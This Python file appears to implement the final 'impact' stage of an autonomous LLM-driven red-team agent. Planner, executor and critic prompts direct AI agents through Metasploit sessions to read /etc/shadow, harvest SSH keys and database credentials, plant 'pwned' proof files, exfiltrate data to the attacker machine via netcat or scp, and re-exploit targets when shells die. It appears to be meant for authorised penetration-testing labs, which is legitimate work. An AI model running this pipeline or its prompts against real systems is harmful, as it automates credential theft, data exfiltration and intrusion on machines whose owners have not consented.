"""
Impact Subgraph — Execute final objective actions and collect proof of compromise.

Fifth and final stage of the killchain: recon → initial_access → persistence → privesc → **impact**.
Produces structured ImpactFindings for the pipeline critic.

Architecture:
    Planner ⟷ RAG → Executor ⟷ SSH/MSF → Critic
                                              ↓
                                       PASS → END
                                       FAIL → Planner (max 3)

Objective-driven: success criteria derived from the operator's original attack objective.

Usage:
    python stages/impact.py                 # Interactive standalone mode
    python stages/impact.py --graph         # Print graph topology
    from stages.impact import run_impact    # Programmatic subgraph call
"""

import sys
import json
import re
import time
import operator
import concurrent.futures
from typing import TypedDict, Annotated, List, Literal

from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver

from core_agents.common import (
    Colors, print_colored, call_llm, parse_json_response,
    run_ssh_command, KALI_IP, MODEL_NAME, FORBIDDEN_COMMANDS,
)
from core_agents.state import ImpactFindings
from tools.rag import query_knowledge_base
from tools.metasploit_tools import msf_session, tool_session_command

# =============================================================================
# CONSTANTS
# =============================================================================

MAX_IMPACT_RETRIES = 3
MAX_PLANNER_TOOL_CALLS = 3
MAX_EXECUTOR_TOOL_CALLS = 10

# Hard wall-clock caps (seconds) for blocking RPC/session calls. send_command /
# run_session_command have their own inner read-loop timeouts, but a blocking
# 'run'/'exploit' MSF command (or a wedged session) can keep the console 'busy'
# for minutes. We enforce a hard ceiling here so a single tool call can never
# hang the whole impact stage. Mirrors the pattern used in stages/privesc.py.
_MSF_WALLCLOCK_TIMEOUT = 90       # outer cap for tool_metasploit_rpc
_MSF_SEND_TIMEOUT = 85            # inner send_command read-loop timeout
_SESSION_WALLCLOCK_TIMEOUT = 20   # outer cap for a single session command

# =============================================================================
# STATE
# =============================================================================

class ImpactState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    target_ip: str
    objective: str
    session_id: str
    session_type: str          # "command_shell" | "meterpreter"
    access_level: str          # "user" | "root"
    prior_findings: str        # Summary of prior stages
    impact_plan: str           # Planner's chosen actions
    impact_result: str         # Executor's summary + collected proof
    actions_taken: list        # List of action descriptions
    loop_step: int
    critic_verdict: str        # "PASS" | "FAIL"
    _verify_prompted: bool     # guard: read-back reminder already injected
    _session_dead_prompted: bool  # guard: dead-session recovery reminder injected

# =============================================================================
# TOOL DEFINITIONS
# =============================================================================

def _run_with_timeout(fn, args=(), kwargs=None, timeout=20, on_timeout="(timed out)"):
    """Run a blocking callable with a hard wall-clock cap. Returns the result,
    or `on_timeout` if it does not complete in time, or an error string on
    exception. The worker thread is abandoned (daemon-style) on timeout so the
    stage never blocks waiting for it. Mirrors stages/privesc.py."""
    kwargs = kwargs or {}
    ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
    try:
        fut = ex.submit(fn, *args, **kwargs)
        try:
            return fut.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            return on_timeout
        except Exception as e:  # surface the underlying error rather than hang
            return f"(call failed: {e})"
    finally:
        # Do NOT block on a lingering worker; let it die in the background.
        ex.shutdown(wait=False)


def _session_command_capped(session_id: str, command: str,
                            timeout: int = _SESSION_WALLCLOCK_TIMEOUT) -> str:
    """Invoke tool_session_command with a hard wall-clock cap, so a wedged
    session or a blocked shell_write RPC can never stall the stage."""
    return str(_run_with_timeout(
        tool_session_command.invoke,
        args=({"session_id": session_id, "command": command},),
        timeout=timeout,
        on_timeout=f"(session command timed out after {timeout}s — treating as failure)",
    ))


@tool
def tool_linux_terminal(command: str):
    """
    Execute a shell command on the KALI ATTACKER machine via SSH.
    This runs on Kali — NOT on the target. Use ONLY for Kali-side tasks:
    - Receiving exfiltrated files, checking listeners, SSH login tests.

    To run commands on the TARGET, use tool_session_command instead.

    NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[Impact Terminal] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


@tool
def tool_metasploit_rpc(command: str):
    """
    Execute a command on the Metasploit CONSOLE.
    Use ONLY for MSF console commands: listing sessions, background, use, set, run, hashdump.

    Do NOT use this for running commands on the target — use tool_session_command instead.
    """
    # Enforce a hard wall-clock cap. send_command's own timeout only fires when
    # the console reports 'busy == False'; a blocking 'run'/'exploit' callback
    # can keep it busy for minutes. The outer ThreadPoolExecutor guarantees this
    # call returns within ~90s no matter what the console does. Mirrors privesc.
    # Connection errors are retried (up to 3 attempts), but each attempt is still
    # bounded by its own wall-clock cap so the total can never hang the stage.
    last_err = None
    for attempt in range(3):
        result = _run_with_timeout(
            msf_session.send_command,
            args=(command,),
            kwargs={"timeout": _MSF_SEND_TIMEOUT},
            timeout=_MSF_WALLCLOCK_TIMEOUT,
            on_timeout=(
                f"MSF command timed out after {_MSF_WALLCLOCK_TIMEOUT}s — treating as "
                "failure. The module likely blocked waiting for a callback; try a "
                "different, non-blocking technique."
            ),
        )
        if isinstance(result, str) and result.startswith("(call failed:"):
            last_err = result
            if attempt < 2 and "connection" in result.lower():
                print_colored(f"[Impact MSF] Connection error, retrying ({attempt+1}/3)...", Colors.WARNING)
                time.sleep(2)
                continue
            return f"RPC Error: {result}"
        return result
    return f"RPC Error: {last_err}"


# Tool sets
PLANNER_TOOLS = [query_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]

# Patterns that indicate a session is dead / unreachable / returned nothing.
_DEAD_SESSION_PATTERNS = re.compile(
    r'(session\s*(?:id\s*)?\d*\s*(?:is\s*)?(?:no\s*longer\s*)?(?:not\s*)?(?:active|alive|valid)'
    r'|no\s+session|session\s+\d+\s+(?:closed|not\s+found|does\s+not\s+exist|died)'
    r'|invalid\s+session|unknown\s+session|failed\s+to\s+(?:read|interact))',
    re.IGNORECASE,
)


def _result_is_dead_or_empty(content: str) -> bool:
    """True if a tool result looks like a dead session or yielded no usable output."""
    if content is None:
        return True
    text = str(content).strip()
    if not text:
        return True
    # Common silent-shell / no-output markers.
    low = text.lower()
    if low in ("(no output)", "no output", "none", "null"):
        return True
    if _DEAD_SESSION_PATTERNS.search(text):
        return True
    return False


def _parse_session_for_target(sessions_output: str, target_ip: str):
    """Parse MSF `sessions` output and return (session_id, session_type) for the
    most recent (highest-numbered) live session whose line references target_ip.

    MSF lists sessions one per line, e.g.:
        3   shell x86/linux  user @ host  10.0.0.1:4444 -> 192.168.34.7:55012
    We anchor the ID to the start of the line and require the target_ip to appear
    somewhere on that line. Returns (None, None) when no match is found."""
    if not sessions_output or not target_ip:
        return None, None
    matches = []
    esc_ip = re.escape(str(target_ip))
    for line in str(sessions_output).splitlines():
        m = re.match(r'^\s*(\d+)\s+(\S+)', line)
        if not m:
            continue
        if re.search(esc_ip, line):
            sid = m.group(1)
            stype_tok = m.group(2).lower()
            if "meterpreter" in stype_tok:
                stype = "meterpreter"
            elif "shell" in stype_tok:
                stype = "command_shell"
            else:
                stype = stype_tok
            matches.append((int(sid), sid, stype))
    if not matches:
        return None, None
    # Highest-numbered = most recently opened session for the target.
    matches.sort(key=lambda t: t[0])
    _, best_sid, best_type = matches[-1]
    return best_sid, best_type


def _find_live_session_id(messages, target_ip: str):
    """Scan recent ToolMessages for MSF `sessions` output and return the live
    session_id for target_ip, or None. Used to propagate a recovered session ID
    discovered during the executor's dead-session recovery branch."""
    if not target_ip:
        return None
    for m in reversed(messages):
        if not isinstance(m, ToolMessage):
            continue
        if getattr(m, "name", "") != "tool_metasploit_rpc":
            continue
        sid, _ = _parse_session_for_target(m.content or "", target_ip)
        if sid:
            return sid
    return None

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

PLANNER_PROMPT = f"""You are an Impact Planner for a Red Team agent. Your attacker IP is {KALI_IP}.

You receive:
1. OBJECTIVE — the operator's original attack goal
2. PRIOR FINDINGS — summary of recon, exploitation, persistence, privesc stages
3. SESSION INFO — active session details
4. ACCESS LEVEL — current privilege level
5. CRITIC FEEDBACK — if retrying, what was missing

**TOOL CLARITY — 3 tools, 3 different targets:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for all target commands: whoami, id, cat, echo, etc.)
- `tool_linux_terminal(command)` → runs ON KALI only (receiving files, listeners, SSH tests)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, hashdump, etc.)

**You have access to `query_knowledge_base`** — search for post-exploitation and data exfiltration techniques.
You may make up to {MAX_PLANNER_TOOL_CALLS} queries.

**Your job:** Interpret the objective and create a concrete impact action list that proves the objective was achieved.

**Standard impact actions (choose based on objective + access level):**

For "get a shell" / "gain access" objectives:
1. Run `whoami` and `id` on TARGET via tool_session_command — proof of access
2. Read `/etc/shadow` (if root) via tool_session_command — proof of root
3. Create any flag/proof file via tool_session_command in a WORLD-WRITABLE path
   (e.g., `echo "pwned" > /tmp/pwned_by_redteam.txt`).
   **Proof-file path rule:** If access_level is `user` (not root), write to `/tmp/`
   or the user home directory (`~/.pwned.txt`), NOT `/root/` — a redirect into
   /root/ fails with permission denied and `echo` still exits 0, so the write
   silently fails and leaves no proof. Only if access_level is `root` may you
   also write to `/root/`. Always `cat` the file back to verify it was created.
4. Gather system info via tool_session_command: `hostname`, `ip addr`, `cat /etc/os-release`

For "exfiltrate data" objectives:
1. Locate target data via tool_session_command (find files, read configs)
2. Copy data to Kali via netcat, scp, or Meterpreter download
3. Verify data received on Kali via tool_linux_terminal

For "demonstrate full control" objectives:
1. All of the above, plus:
2. List running services, installed software via tool_session_command
3. Read SSH keys, application configs, database creds via tool_session_command
4. Create proof bundle: system info + credentials + network info

**SESSION HEALTH — plan for an unstable session:**
The shell you inherited may be dead, silent, or non-interactive. Before
committing to a long impact plan, account for recovery:
1. If session commands return empty output or a "session not active / no
   session" error, the plan must FIRST call `tool_metasploit_rpc("sessions")`
   to list active sessions.
2. If a DIFFERENT session ID is alive, switch to it — use that ID for all
   subsequent `tool_session_command` calls.
3. If the inherited shell is a non-interactive `command_shell` returning no
   output, try `tool_metasploit_rpc("sessions -u <id>")` to upgrade it to a
   meterpreter session, then re-list sessions to get the new ID.
4. If no session is alive and access_level was `root` or the shell came from a
   noisy/unstable exploit (e.g. an IRC/UnrealIRCd backdoor, mod_copy ProFTPD
   shell), consider re-exploiting via `tool_metasploit_rpc` to regain a shell.
5. Only fall back to reporting failure if no session can be recovered after one
   recovery attempt.

**Output format (final answer — no more tool calls):**

IMPACT PLAN:
OBJECTIVE INTERPRETATION: <what "success" means for this specific objective>
ACTIONS:
1. <action description> — TOOL: tool_session_command, COMMAND: <exact command>
2. <action description> — TOOL: tool_linux_terminal, COMMAND: <exact command>
...

SUCCESS CRITERIA: <what evidence proves the objective was met>

**On retry:**
- Read critic feedback
- Add missing proof actions
- Try alternative approaches to gather evidence
"""

EXECUTOR_PROMPT_TEMPLATE = """You are an Impact Executor for a Red Team agent. Your attacker IP is {kali_ip}.

You have 3 tools — each runs in a DIFFERENT place:

**TOOL CLARITY:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL target commands)
- `tool_linux_terminal(command)` → runs ON KALI only (receiving files, checking listeners)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, etc. — NOT for target commands)

**CRITICAL:** To run commands on the target, ALWAYS use `tool_session_command`. This is reliable and atomic.
Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.

**STEP-BY-STEP EXAMPLE (session {session_id}):**
1. Call tool_session_command("{session_id}", "whoami")
   → Output: "root"
2. Call tool_session_command("{session_id}", "id")
   → Output: "uid=0(root)..."
3. Call tool_session_command("{session_id}", "cat /etc/shadow")
   → Output: "root:$6$..."
4. Call tool_session_command("{session_id}", "echo 'COMPROMISED by Red Team' > /root/pwned.txt")
   → Creates file on the TARGET
5. Call tool_session_command("{session_id}", "cat /root/pwned.txt")
   → Output: "COMPROMISED by Red Team" (verifies file creation)

**Your job:** Execute the impact plan and collect concrete proof ON THE TARGET.

**STEP 0 (shell stability check):**
If your first `whoami` call returns empty / "(no output)", the shell may be
non-interactive or dead. Confirm with `tool_session_command("{session_id}", "echo ALIVE")`.
- If that ALSO returns empty, call `tool_metasploit_rpc("sessions")` to see what
  is alive. If a different session ID is live, use it for all further commands.
- If only this silent shell exists, call
  `tool_metasploit_rpc("sessions -u {session_id}")` to upgrade it to meterpreter,
  then call `tool_metasploit_rpc("sessions")` to read the NEW session ID and use
  that ID going forward.
- If the upgrade fails and no live session remains, state clearly in your summary
  that the shell is unstable/dead and report failure — do NOT fabricate output.

**Rules:**
1. Execute commands ONE AT A TIME via tools
2. Your VERY FIRST tool call MUST be: `tool_session_command("{session_id}", "whoami")`
3. READ each output — this IS the proof
4. SAVE important outputs — they become evidence
5. Do NOT run more than {max_tools} commands
6. ALL evidence-gathering and file creation must happen ON THE TARGET via `tool_session_command`

**When done, provide a structured text summary of ALL evidence collected.**
Include the actual command outputs as proof.
Do not make any more tool calls after providing your summary.
"""

CRITIC_PROMPT = f"""You are an Impact Critic for a Red Team operation. Your IP is {KALI_IP}.

You evaluate whether the impact stage achieved the operator's objective with concrete proof.

**You receive:**
- The original objective
- The impact plan
- The execution result with collected evidence
- The loop step count

**Evaluation criteria:**

1. **Objective met?** — Does the evidence satisfy the operator's stated goal?
   - If objective was "get a shell": is there proof of command execution on target?
   - If objective was "exfil data": was data actually transferred to the attacker?
   - If objective was "prove root": is there output of `whoami` showing root?

2. **Concrete evidence?** — Are there actual command outputs (not just claims)?
   - `whoami` output = concrete
   - `/etc/shadow` contents = concrete
   - "I believe we have access" without proof = NOT concrete

3. **Flag planted?** — Was a proof file created on the target? (bonus, not required)

**Verdict:**
- **PASS** if: objective is substantially met with concrete evidence
- **FAIL** if: no concrete evidence, OR objective clearly not achieved

**Apply the same strict standard on every attempt** — do NOT relax the criterion
just because it is the final loop step. Partial proof (e.g. only `whoami` output
when the objective required writing a proof file or exfiltrating data) is a FAIL.
The orchestrator handles the last-attempt exit on its own; you only judge evidence.

**Output format:**

VERDICT: <PASS|FAIL>

EVIDENCE_QUALITY: <strong|moderate|weak>

ASSESSMENT: <2-3 sentence summary of what was proven>

FEEDBACK: <if FAIL — what specific evidence is still needed.
           Name exact commands to run for proof.>
"""

# =============================================================================
# NODE IMPLEMENTATIONS
# =============================================================================

def planner_node(state: ImpactState) -> dict:
    """Interpret objective and plan impact actions. ReAct with RAG."""
    messages = state["messages"]
    print_colored("\n[Impact Planner] Planning impact actions...", Colors.HEADER)

    # Count ONLY this planner cycle's RAG calls. Filter by tool name so stale
    # executor ToolMessages (tool_session_command, etc.) accumulated from prior
    # retry loops via operator.add don't prematurely trip the RAG cap.
    planner_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage):
            break
        if isinstance(msg, ToolMessage) and getattr(msg, "name", "") == "query_knowledge_base":
            planner_tool_count += 1

    if planner_tool_count == 0:
        context = (
            f"OBJECTIVE: {state.get('objective', '')}\n\n"
            f"TARGET: {state.get('target_ip', '')}\n"
            f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"ACCESS LEVEL: {state.get('access_level', 'unknown')}\n\n"
            f"PRIOR FINDINGS SUMMARY:\n{state.get('prior_findings', '')}\n"
        )
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nPREVIOUS FAILURE:\n{msg.content}\n"
                break
        planner_msgs = [HumanMessage(content=context)]
    else:
        cycle_start = 0
        for i in range(len(messages) - 1, -1, -1):
            if isinstance(messages[i], HumanMessage):
                cycle_start = i
                break
        planner_msgs = list(messages[cycle_start:])

    if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
        print_colored(f"[Impact Planner] RAG cap reached.", Colors.WARNING)
        response = call_llm(
            messages=planner_msgs + [HumanMessage(content="Max queries reached. Produce your impact plan now.")],
            system_prompt=PLANNER_PROMPT
        )
    else:
        response = call_llm(
            messages=planner_msgs,
            system_prompt=PLANNER_PROMPT,
            tools=PLANNER_TOOLS
        )

    if response.content and not response.tool_calls:
        print_colored(f"[Impact Planner] Plan:\n{response.content[:300]}", Colors.OKGREEN)

        # Extract action items from plan
        actions = []
        for line in response.content.split("\n"):
            line = line.strip()
            if re.match(r'^\d+\.', line):
                actions.append(line)

        return {
            "messages": [AIMessage(content=f"[Impact Planner] {response.content}")],
            "impact_plan": response.content,
            "actions_taken": actions,
            # Reset the read-back guard at the start of each fresh plan so the
            # write-verification check is active for every new executor cycle
            # (the flag persists across operator.add accumulation otherwise).
            "_verify_prompted": False,
            # Re-arm dead-session recovery on every new planner cycle. Like
            # _verify_prompted, this flag accumulates via operator.add and would
            # otherwise stay True forever once tripped — permanently disabling
            # the executor's dead-session recovery on retry cycles 2+.
            "_session_dead_prompted": False,
        }

    # RAG-in-flight path (planner emitted tool_calls). Always reset BOTH guards
    # here too: _verify_prompted and _session_dead_prompted accumulate via
    # operator.add, so without resetting on EVERY planner return they stay True
    # forever once tripped, permanently disabling the executor's read-back and
    # dead-session recovery checks.
    return {
        "messages": [response],
        "_verify_prompted": False,
        "_session_dead_prompted": False,
    }


def executor_node(state: ImpactState) -> dict:
    """Execute impact actions and collect proof. ReAct loop."""
    messages = state["messages"]
    print_colored("\n[Impact Executor] Executing impact actions...", Colors.HEADER)

    executor_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Impact Planner]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Walk backward and stop at the MOST RECENT planner message so the executor
    # only sees the current retry cycle's context (messages accumulate via
    # operator.add across all loops).
    executor_msgs = []
    for msg in reversed(messages):
        executor_msgs.insert(0, msg)
        if isinstance(msg, AIMessage) and "[Impact Planner]" in (msg.content or ""):
            break
    if not executor_msgs:
        executor_msgs = [messages[-1]]

    # Build dynamic executor prompt with actual session ID
    executor_prompt = EXECUTOR_PROMPT_TEMPLATE.format(
        kali_ip=KALI_IP,
        session_id=state.get("session_id", "?"),
        max_tools=MAX_EXECUTOR_TOOL_CALLS,
    )

    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[Impact Executor] Tool cap ({executor_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=(
                "Max tool calls reached. Summarize all evidence collected so far."
            ))],
            system_prompt=executor_prompt
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=executor_prompt,
            tools=EXECUTOR_TOOLS
        )

    if response.content and not response.tool_calls:
        # --- Defect (executor): refuse to grade a no-execution summary ---
        # Count real commands run on the target/Kali in THIS cycle. If the LLM
        # produced planning prose without ever calling a non-planner tool, we
        # must NOT set impact_result (the critic would grade planning text as
        # evidence). Inject a correction and route back through the tools once.
        real_tool_count = 0
        executor_results = []
        for m in executor_msgs:
            if isinstance(m, ToolMessage) and getattr(m, "name", "") in (
                "tool_session_command", "tool_linux_terminal", "tool_metasploit_rpc"
            ):
                real_tool_count += 1
                executor_results.append(m)

        # --- Defect (executor): dead-session / empty-output detection ---
        # The session can die mid-cycle: the first command returns real output,
        # then every later tool_session_command returns "" or a dead-session
        # token. With real_tool_count > 0 the no-execution guard above does not
        # fire, so the LLM would summarize fabricated results from empty
        # evidence. Detect when the MAJORITY of this cycle's results are dead or
        # empty and force a session re-discovery + switch (once, guarded).
        if real_tool_count > 0 and not state.get("_session_dead_prompted", False):
            dead_count = sum(
                1 for m in executor_results if _result_is_dead_or_empty(m.content)
            )
            if dead_count * 2 >= real_tool_count:  # majority (>=50%) dead/empty
                print_colored(
                    f"[Impact Executor] {dead_count}/{real_tool_count} results dead/empty "
                    "— forcing session recovery.",
                    Colors.WARNING,
                )
                recover = HumanMessage(content=(
                    "The session appears to be dead or silent (commands returned no "
                    "usable output). Do NOT summarize from empty evidence. First call "
                    "tool_metasploit_rpc(\"sessions\") to list live sessions. If a "
                    "different session ID is alive, switch to it for subsequent "
                    "tool_session_command calls and re-gather evidence. If the current "
                    "shell is a non-interactive command_shell, try "
                    f"tool_metasploit_rpc(\"sessions -u {state.get('session_id', '?')}\") "
                    "to upgrade it to meterpreter, then re-list sessions for the new ID. "
                    "If no session can be recovered after one attempt, report failure "
                    "with an explanation in your summary."
                ))
                recovered = call_llm(
                    messages=executor_msgs + [response, recover],
                    system_prompt=executor_prompt,
                    tools=EXECUTOR_TOOLS,
                )
                recovery_update = {
                    "messages": [recover, recovered],
                }
                # --- Defect 4: propagate a recovered session_id + keep recovery
                # armed while recovery is still in flight. ---
                # If the recovery response carries tool_calls, recovery is NOT
                # done yet (the ToolNode will run `sessions`/`sessions -u` and
                # re-enter the executor). Leave the guard OFF so the NEXT executor
                # cycle can re-detect dead results from those tool calls instead
                # of summarizing fabricated proof from a still-down session/RPC.
                if getattr(recovered, "tool_calls", None):
                    recovery_update["_session_dead_prompted"] = False
                else:
                    recovery_update["_session_dead_prompted"] = True
                # Try to extract a live session_id for target_ip from any MSF
                # `sessions` output already present in this cycle's ToolMessages,
                # so all subsequent tool_session_command calls use the right ID.
                new_sid = _find_live_session_id(executor_msgs, state.get("target_ip", ""))
                if new_sid and new_sid != str(state.get("session_id", "")):
                    print_colored(
                        f"[Impact Executor] Switching to recovered session #{new_sid}.",
                        Colors.OKGREEN,
                    )
                    recovery_update["session_id"] = new_sid
                return recovery_update

        if real_tool_count == 0 and not state.get("_verify_prompted", False):
            print_colored(
                "[Impact Executor] No commands executed yet — forcing command run.",
                Colors.WARNING,
            )
            correction = HumanMessage(content=(
                "You have not run any commands on the target yet. "
                f"Call tool_session_command(\"{state.get('session_id', '?')}\", \"whoami\") "
                "now to begin collecting evidence."
            ))
            forced = call_llm(
                messages=executor_msgs + [response, correction],
                system_prompt=executor_prompt,
                tools=EXECUTOR_TOOLS,
            )
            return {"messages": [correction, forced]}

        # --- Defect 3: verification read-back enforcement ---
        # If the executor wrote a file (echo ... > /path  or  tee /path) but
        # never read it back (cat /path / ls of that path), force one more pass
        # so a falsely-claimed write (echo exits 0 even on permission error)
        # cannot reach the critic unverified. Guard with a state flag so we
        # only ever inject the reminder once and never hang.
        if not state.get("_verify_prompted", False):
            written_paths = []
            verified_paths = set()
            # Scan AIMessage tool_calls in this cycle for write vs read commands.
            for m in executor_msgs:
                tcs = getattr(m, "tool_calls", None)
                if not tcs:
                    continue
                for tc in tcs:
                    cmd = str(tc.get("args", {}).get("command", ""))
                    for wm in re.finditer(r'>>?\s*(/\S+)', cmd):
                        written_paths.append(wm.group(1))
                    if "tee " in cmd:
                        for tm in re.finditer(r'tee\s+(?:-a\s+)?(/\S+)', cmd):
                            written_paths.append(tm.group(1))
                    rm = re.search(r'\b(?:cat|ls|head|tail|stat)\b[^\n]*?(/\S+)', cmd)
                    if rm:
                        verified_paths.add(rm.group(1))
            # Also scan ToolMessage CONTENT: writes done via tool_metasploit_rpc
            # (session -c 'echo x > /p') or tool_linux_terminal (scp) never put a
            # "> /path" pattern into the session_command args, so the tool_calls
            # scan above misses them. Catch redirects echoed back in the output.
            for m in executor_msgs:
                if not isinstance(m, ToolMessage):
                    continue
                if getattr(m, "name", "") not in (
                    "tool_session_command", "tool_metasploit_rpc", "tool_linux_terminal"
                ):
                    continue
                cmd_content = m.content or ""
                for wm in re.finditer(r'>>?\s*(/\S+)', cmd_content):
                    written_paths.append(wm.group(1))
                for tm in re.finditer(r'tee\s+(?:-a\s+)?(/\S+)', cmd_content):
                    written_paths.append(tm.group(1))
            unverified = [p for p in written_paths if p not in verified_paths]
            if unverified:
                print_colored(
                    f"[Impact Executor] Unverified write(s): {unverified[:3]} — forcing read-back.",
                    Colors.WARNING,
                )
                reminder = HumanMessage(content=(
                    f"You wrote to {unverified[:3]} but did not verify it. "
                    f"Call tool_session_command to `cat` (or `ls -la`) each written "
                    f"file and confirm it exists before summarizing."
                ))
                verify_response = call_llm(
                    messages=executor_msgs + [response, reminder],
                    system_prompt=executor_prompt,
                    tools=EXECUTOR_TOOLS,
                )
                # If the LLM now wants to verify, route back through tools.
                if getattr(verify_response, "tool_calls", None):
                    return {
                        "messages": [reminder, verify_response],
                        "_verify_prompted": True,
                    }
                # Otherwise it re-summarized; fall through using the new content.
                response = verify_response if verify_response.content else response

        # --- Defect 1: build actions_taken from REAL outputs, not plan text ---
        actions = list(state.get("actions_taken", []))
        new_actions = [
            l.strip()
            for l in (response.content or "").split("\n")
            if l.strip() and (re.match(r'^[\d\-\*]', l.strip()) or "->" in l)
        ]
        actions.extend(new_actions[:20])
        return {
            "messages": [response],
            "impact_result": response.content,
            "actions_taken": actions,
            "_verify_prompted": True,
        }

    return {"messages": [response]}


def critic_node(state: ImpactState) -> dict:
    """Evaluate whether objective was met with concrete proof."""
    current_step = state.get("loop_step", 0)
    print_colored("\n[Impact Critic] Evaluating evidence...", Colors.HEADER)

    # --- Defect 5: never let the LLM grade an empty execution result ---
    if not state.get("impact_result", "").strip():
        print_colored("[Impact Critic] Empty execution result — forcing re-execution.", Colors.WARNING)
        return {
            "messages": [HumanMessage(content=(
                "CRITIC FEEDBACK: No execution result was produced. "
                "Executor must run commands on the target and collect concrete evidence."
            ))],
            "loop_step": current_step + 1,
            "critic_verdict": "FAIL",
        }

    evidence = (
        f"OBJECTIVE: {state.get('objective', '')}\n\n"
        f"IMPACT PLAN:\n{state.get('impact_plan', '')}\n\n"
        f"EXECUTION RESULT:\n{state.get('impact_result', '')}\n\n"
        f"ACCESS LEVEL: {state.get('access_level', 'unknown')}\n\n"
        f"LOOP STEP: {current_step} of {MAX_IMPACT_RETRIES}\n"
    )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )

    verdict_text = response.content.strip()
    print_colored(f"[Impact Critic] {verdict_text[:300]}", Colors.OKCYAN)

    new_step = current_step + 1
    upper = verdict_text.upper()
    # Strict parse: only "VERDICT: PASS" counts. The LLM is instructed to emit
    # exactly that token. The old loose fallback ("PASS" anywhere with no "FAIL")
    # matched the word PASS inside FEEDBACK/ASSESSMENT text and caused false PASS.
    if "VERDICT: PASS" in upper:
        verdict = "PASS"
    else:
        verdict = "FAIL"

    print_colored(f"[Impact Critic] Verdict: {verdict}",
                  Colors.OKGREEN if verdict == "PASS" else Colors.FAIL)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[Impact Critic] PASS — {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "PASS",
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "FAIL",
        }


# =============================================================================
# TOOL NODES
# =============================================================================

def planner_tools_node(state: ImpactState) -> dict:
    tool_node = ToolNode(PLANNER_TOOLS)
    return tool_node.invoke(state)

def executor_tools_node(state: ImpactState) -> dict:
    tool_node = ToolNode(EXECUTOR_TOOLS)
    return tool_node.invoke(state)

# =============================================================================
# ROUTING LOGIC
# =============================================================================

def route_after_planner(state: ImpactState) -> Literal["planner_tools", "executor"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, HumanMessage):
                break
            if isinstance(m, ToolMessage) and getattr(m, "name", "") == "query_knowledge_base":
                tool_count += 1
        if tool_count >= MAX_PLANNER_TOOL_CALLS:
            return "executor"
        return "planner_tools"
    return "executor"


def route_after_executor(state: ImpactState) -> Literal["executor_tools", "critic"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and "[Impact Planner]" in (m.content or ""):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "critic"
        return "executor_tools"
    return "critic"


def route_after_critic(state: ImpactState) -> Literal["planner", "__end__"]:
    time.sleep(2)
    current_step = state.get("loop_step", 0)
    if current_step >= MAX_IMPACT_RETRIES:
        print_colored("--- MAX IMPACT RETRIES REACHED ---", Colors.FAIL)
        return "__end__"
    verdict = state.get("critic_verdict", "FAIL")
    if verdict == "PASS":
        return "__end__"
    return "planner"

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    workflow = StateGraph(ImpactState)

    workflow.add_node("planner", planner_node)
    workflow.add_node("planner_tools", planner_tools_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node)
    workflow.add_node("critic", critic_node)

    workflow.set_entry_point("planner")

    # Planner ReAct loop
    workflow.add_conditional_edges(
        "planner", route_after_planner,
        {"planner_tools": "planner_tools", "executor": "executor"}
    )
    workflow.add_edge("planner_tools", "planner")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor", route_after_executor,
        {"executor_tools": "executor_tools", "critic": "critic"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Critic routing
    workflow.add_conditional_edges(
        "critic", route_after_critic,
        {"planner": "planner", END: END}
    )

    return workflow

# =============================================================================
# FINDINGS EXTRACTION
# =============================================================================

def _extract_impact_findings(state: dict) -> ImpactFindings:
    critic_verdict = state.get("critic_verdict", "")
    impact_plan = state.get("impact_plan", "")
    impact_result = state.get("impact_result", "")
    actions_taken = state.get("actions_taken", [])
    objective = state.get("objective", "")

    success = critic_verdict == "PASS"

    # Build actions list from actions_taken or parse from result
    if not actions_taken:
        # Try to extract from impact_result
        for line in (impact_result or "").split("\n"):
            line = line.strip()
            if line and (line.startswith("-") or re.match(r'^\d+\.', line)):
                actions_taken.append(line)

